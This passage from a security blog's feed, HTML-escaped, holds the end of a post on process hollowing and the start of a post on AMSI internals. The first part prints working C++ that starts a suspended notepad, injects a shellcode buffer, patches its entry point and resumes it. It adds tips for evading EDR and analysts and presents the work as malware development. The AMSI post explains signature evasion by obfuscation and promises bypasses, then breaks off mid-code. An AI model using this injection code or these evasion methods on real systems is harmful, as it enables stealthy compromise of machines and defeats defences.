        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68\x54\x49\x54\x4c\x68\x72\x65\x6b\x74\x68\x67\x65\x74\x20&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31\xc9\x88\x4c\x24\x16\x89\xe1\x31\xd2\x52\x53\x51\x52\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd0\x31\xc0\x50\xff\x55\x08&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;


    HOST&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; hostProcess &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; HOST();
    LPSTARTUPINFOA si &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; STARTUPINFOA();
    LPPROCESS_INFORMATION pi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; PROCESS_INFORMATION();
    PROCESS_BASIC_INFORMATION&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pbi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; PROCESS_BASIC_INFORMATION();
    DWORD returnLength &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    CONTEXT ctx;

    SHELLCODE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; SHELLCODE();
    s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; buf;
    s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcodeSize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(buf);
        
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (CreateProcessA(
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Windows&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;System32&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;notepad.exe&amp;#34;&lt;/span&gt;, 
        (LPSTR)&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Windows&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;System32&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;notepad.exe&amp;#34;&lt;/span&gt;,
        NULL, NULL, TRUE, 
        CREATE_SUSPENDED &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; CREATE_NO_WINDOW, 
        NULL, NULL, si, pi) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; FALSE)
    {
        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Failed to execute notepad.exe&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; FALSE;
    }
    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!]Executed notepad.exe&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;

    hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pi&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;hProcess;
    ctx.ContextFlags &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; CONTEXT_FULL;
    fNtGetContextThread(pi&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;hThread, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;ctx);

    NtQueryInformationProcess(
        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
        ProcessBasicInformation, 
        pbi,
        &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(PROCESS_BASIC_INFORMATION), 
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;returnLength);
    DWORD pebImageBaseOffset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (DWORD)pbi&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;PebBaseAddress &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;;

    SIZE_T bytesRead &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;ReadProcessMemory(
        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
        (LPCVOID)pebImageBaseOffset, 
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress,
        &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bytesRead) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; bytesRead &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
    {
        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed to read image base address&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    }

    PVOID remoteShellcodeAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; InjectShellcode(hostProcess, s);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (remoteShellcodeAddress &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
    {
        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;shellcode injection failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;; 
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    }
   
    PVOID addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PatchHostProcess(hostProcess, remoteShellcodeAddress)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
    {
        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed tp patch host&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    } 

    fNtSetContextThread(pi&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;hThread, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;ctx);

    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Resumed thread&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    ResumeThread(pi&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;hThread);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Above code does exactly what is listed above. First, it starts a notepad
process suspend it&amp;rsquo;s exution. then it retrieves &lt;strong&gt;thread context&lt;/strong&gt; from theprocess. Thread context is important because, without setting context back
to what it was before suspending will cause a program crash.&lt;/p&gt;
&lt;p&gt;Then it proceed to retrieve &lt;strong&gt;ImageBaseAddress&lt;/strong&gt; of the process using
&lt;code&gt;NtQueryInformationProcess&lt;/code&gt; and &lt;code&gt;ReadProcessMemory&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Then the shellcode is injected into the target process by the function
&lt;strong&gt;InjectShellcode&lt;/strong&gt;. This function uses the same technique discussed
arlier.&lt;/p&gt;
&lt;p&gt;The main function then calls &lt;strong&gt;PatchHostProcess&lt;/strong&gt;. This function reads the
host process&amp;rsquo;s image into the memory and parses the entry point. Then in
the local copy, it creates a hook that jumps into the shellcode that
&lt;strong&gt;InjectShellcode&lt;/strong&gt; injected. Then it uses the above code injection method
and creates a section in the local process, however, before creating a
section in the remote process, it unmaps the process image using a call to
&lt;code&gt;ZwUnmapViewOfSection&lt;/code&gt;. it then creates the section at the same address
that the original image was mapped.&lt;/p&gt;
&lt;p&gt;Its worth noting that it is possible to hook any address of the process
image as long as it does not spawn notepad (or whatever).&lt;/p&gt;
&lt;p&gt;Result after compiling and running the code&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/process-hollowing/4.png&#34; alt=&#34;result&#34;&gt;&lt;/p&gt;
&lt;p&gt;permissions of the shellcode&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/process-hollowing/5.png&#34; alt=&#34;shellcode&amp;rsquo;s permissions&#34;&gt;&lt;/p&gt;
&lt;p&gt;permissions of the original notepad image&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/process-hollowing/6.png&#34; alt=&#34;notepad image&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;more-stealth&#34;&gt;More stealth&lt;/h2&gt;
&lt;p&gt;Even though the technique is capable of fooling both analysts and some EDR,it can be stll detected if defense solutions are monitoring
&lt;code&gt;CreateProcessA&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;There are many workarounds for this. One can directly call
&lt;code&gt;NtCreateUserProcess&lt;/code&gt; or &lt;code&gt;NtCreateProcessEx&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Another method is to Hook one of those APIs and call &lt;code&gt;CreateProcessA&lt;/code&gt; with
false arguments. For
example,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- Hook `NtCreateUserProcess` so it will jump into a specified location
- Call CreateProcessA without `CREATE_SUSPENDED` flag.
- Set `CREATE_SUSPENDED` flag and jump back to `NtCreateUserProcess`
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;(to learn more about above technique, my seggestion is to reverse IcedID)&lt;/p&gt;
&lt;p&gt;The other thing to consider is changing the memory permissions of the
target process after remapping. Even without doing that, it can mislead
an analyst to beleive it as the malicious binary since it has permissions
&lt;strong&gt;RWX&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Even after that, once analyst has dumped the original executable image
thinking it is malicous to analyze it, it is pretty easy to indeify the
hook. As stated earlier, it is possible hook any other location as long as
it does not start the original process.&lt;/p&gt;
&lt;p&gt;It is also possible to implement other instructions to change the control
flow. For example, &lt;code&gt;push / ret&lt;/code&gt;.&lt;/p&gt;
&lt;h1 id=&#34;references&#34;&gt;References&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://cysinfo.com/hollowfind/&#34;&gt;hollowfind volatility plugin&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://cysinfo.com/detecting-deceptive-hollowing-techniques/&#34;&gt;DETECTING DECEPTIVE PROCESS HOLLOWING TECHNIQUES USING HOLLOWFIND VOLATILITY PLUGIN&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;the-end&#34;&gt;The end&lt;/h1&gt;
&lt;p&gt;This blog post explored the concept of section mapping and how it can be
leveraged when developing malware.&lt;/p&gt;
&lt;p&gt;#Spread Anarchy!&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>From AMSI to Reflection</title>
      <link>https://rxOred.github.io/post/csharploader/bypassing-amsi-with-csharp/</link>
      <pubDate>Sat, 23 Oct 2021 14:20:04 +0000</pubDate>
      
      <guid>https://rxOred.github.io/post/csharploader/bypassing-amsi-with-csharp/</guid>
      <description>In Windows environments, in both initial access and post-exploitation phases, script-based malware plays a major role. Often, hackers utilize microsoft office suite to gain initial access (using droppers, loaders) to the victim and Windows powershell to explore internal network, perform scans&amp;hellip; basically to do the post exploitation stuff. (well of course, there are powershell based droppers.)
There is something that is common to both of these tools. Windows scripting engine.</description>
      <content>&lt;p&gt;In Windows environments, in both initial access and post-exploitation phases, script-based malware plays a major role. Often, hackers utilize microsoft
office suite to gain initial access (using droppers, loaders) to the victim and Windows powershell to explore internal network, perform scans&amp;hellip; basically to
do the post exploitation stuff. (well of course, there are powershell based droppers.)&lt;/p&gt;
&lt;p&gt;There is something that is common to both of these tools. Windows scripting engine.&lt;/p&gt;
&lt;p&gt;And as a result, Microsoft and antimalware vendors have developed many security mechanisms to deal with those threats that utilize script-based malware.
For example, modern anti-malware solutions can statically analyze scripts, binaries and detect whether they are malicious or not using signatures such as strings.&lt;/p&gt;
&lt;p&gt;And because of that, malware authors use various techniques to bypass those defense mechanisms. One of the major techniques is code obfuscation.&lt;/p&gt;
&lt;p&gt;consider the following example, that I took from MSDN.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; displayEvilString
    &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        Write-Host &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pwnd!&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Assuming the above PowerShell snippet is malicious, we can write a signature to detect the malware. this signature can be &lt;code&gt;Write-Host &#39;pwnd!&#39;&lt;/code&gt; or simply &lt;code&gt;&#39;pwnd!&#39;&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;So to avoid signature-based detection, the above snippet can be obfuscated like shown below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; obfuscatedDisplayEvilString
    &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        $xorKey &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;
        $code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LHsJexJ7D3see1Z7M3sUewh7D3tbe1x7C3sMexV7H3tae1x7&amp;#34;&lt;/span&gt;
        $byte &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Convert&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;::FromBase64String&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$code&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
        $newBytes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; foreach&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$byte in $bytes&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            $byte -bxor $xorKey
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
        $newCode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;System.Text.Encoding&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;::Unicode.GetString&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$newBytes&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And this is a win for malware authors since this is beyond what anti-malware solutions can emulate or detect until AMSI joins the conversation.&lt;/p&gt;
&lt;h2 id=&#34;antimalware-scan-interface-amsi&#34;&gt;Antimalware Scan Interface (AMSI)&lt;/h2&gt;
&lt;p&gt;AMSI is a standard interface that allows applications to interact with anti-malware products installed on the system. This means is that it provides
an API for Application developers. Application developers can use the API to implement security features to make sure that the end-user is safe. According
to Microsoft, that&amp;rsquo;s why they consider Application developers as a target audience of this standard interface.&lt;/p&gt;
&lt;p&gt;The other one is Anti-malware vendors. Any anti-malware vendor can provide an interface for AMSI to work with. By doing that, they can detect a large number of malicious activities that they could not.  By default, AMSI uses Windows defender as the backing detection engine.&lt;/p&gt;
&lt;p&gt;According to Microsoft, AMSI provides the following features by default.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;User Account Control&lt;/li&gt;
&lt;li&gt;PowerShell&lt;/li&gt;
&lt;li&gt;Windows Script Host&lt;/li&gt;
&lt;li&gt;JScript &amp;amp;&amp;amp; VBScript&lt;/li&gt;
&lt;li&gt;Office VBA macros&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;As it is clear from those default features, AMSI specifically provides anti-malware security mechanisms to defend against dynamic script-based malware.&lt;/p&gt;
&lt;p&gt;when running a script, even though the code is initially obfuscated, it has to be deobfuscated to go through the scripting engine. At this point, AMSI APIs can be used to scan the script and determine whether it is malicious or not.&lt;/p&gt;
&lt;p&gt;AMSI can also be useful in scenarios like invoking malicious PowerShell commands.&lt;/p&gt;
&lt;p&gt;In this article I&amp;rsquo;m going to focus on the internals of AMSI. in the next one, I&amp;rsquo;ll provide y&amp;rsquo;all with some bypass techniques.&lt;/p&gt;
&lt;h2 id=&#34;demo&#34;&gt;Demo&lt;/h2&gt;
&lt;p&gt;So let&amp;rsquo;s take Safetykatz as our example.&lt;/p&gt;
&lt;p&gt;When we run the binary, the result we get is.
&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/AMSI.png&#34; alt=&#34;AMSI&#34;&gt;&lt;/p&gt;
&lt;p&gt;See, as we expected, PowerShell stops the execution of the program once it has detected the program is suspicious using AMSI.
So, how can we bypass this?, well before that, we have to dive deep into AMSI internals to understand how things work.&lt;/p&gt;
&lt;h2 id=&#34;amsi-internals&#34;&gt;AMSI internals&lt;/h2&gt;
&lt;p&gt;As I previously mentioned, any anti-malware vendor can become an AMSI provider and inspect data sent by applications via the AMSI interface. If the content submitted for the scan is detected as malicious, the consuming application will be alerted. In our case, Windows PowerShell uses Windows defender as the AMSI provider.
When we input a malicious command or execute a malicious program, PowerShell will pass everything to windows defender before doing any execution.
Anti-malware vendors must do all the scans and detect whether the received input is malicious or not.&lt;/p&gt;
&lt;p&gt;For application programmers to interact with the AMSI, it provides a dll called, amsi.dll. Let&amp;rsquo;s examine PowerShell from a process hacker to check whether this dll is loaded.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/powershellProperties.png&#34; alt=&#34;PoweshellProperties&#34;&gt;&lt;/p&gt;
&lt;p&gt;as we can see, amsi.dll has been loaded into powershell.exe. Now, let&amp;rsquo;s take a look at this dll in-depth and see if we can find anything interesting.
Even without looking at the dll, we can think of a technique to bypass AMSI, using dll injection and impersonating several functions exported by the dll. Anyway, let&amp;rsquo;s choose the hard way, and before diving deep into disassembly, let&amp;rsquo;s examine the export table of amsi.dll.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/Exports.png&#34; alt=&#34;Exports&#34;&gt;&lt;/p&gt;
&lt;p&gt;Out of the above exported functions, only two are important to us.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;AmsiScanBuffer&lt;/li&gt;
&lt;li&gt;AmsiScanString&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;amsiscanbuffer&#34;&gt;AmsiScanBuffer&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer&#34;&gt;here&lt;/a&gt;, check out the documentation first. According to the MSDN and as well as the name suggests, the &lt;code&gt;AmsiScanBuffer&lt;/code&gt; function scans a buffer that is filled for malware.&lt;/p&gt;
&lt;p&gt;As MSDN says, this function returns &lt;code&gt;S_OK&lt;/code&gt; if the call is successful. However, the return value does not indicate whether the buffer is malicious. instead, the function uses an output parameter of type &lt;code&gt;AMSI_RESULT&lt;/code&gt; to send the scan results.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;enum&lt;/span&gt; AMSI_RESULT {
        AMSI_RESULT_CLEAN,
        AMSI_RESULT_NOT_DETECTED,
        AMSI_RESULT_BLOCKED_BY_ADMIN_START,
        AMSI_RESULT_BLOCKED_BY_ADMIN_END,
        AMSI_RESULT_DETECTED
    } ;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And here&amp;rsquo;s how this function looks like in disassembly.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/AmsiScanBufferPrologue.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;here we can see stack pointer is stored in &lt;code&gt;r11&lt;/code&gt; register and since this is x64 _stdcall, the first four parameters are stored in rcx, rdx, r8 and r9 registers. Rest are stored in the stack. With that information, we can assume a pointer to the &lt;code&gt;AMSI_RESULT&lt;/code&gt; enum is stored in the stack.&lt;/p&gt;
&lt;p&gt;then we can see a series of comparisons around global data.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/AmsiScanBuffer2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;followed by,&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/AmsiScanBuffer4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;which can be decompiled down into,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;    HRESULT &lt;span style=&#34;color:#66d9ef&#34;&gt;__stdcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;AmsiScanBuffer&lt;/span&gt;
    (
            HAMSICONTEXT amsiContext, 
            PVOID buffer, 
            ULONG length, 
            LPCWSTR contentName, 
            HAMSISESSION amsiSession, 
            AMSI_RESULT &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;result
    )
    {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;auto&lt;/span&gt; var;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((handle &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;handle) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(handle &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1c&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;))
        {
            SomeFunc(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(handle &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;), buffer, lengthm amsiSession, result);
        }

        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (buffer &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; result &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; amsiContext &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; 
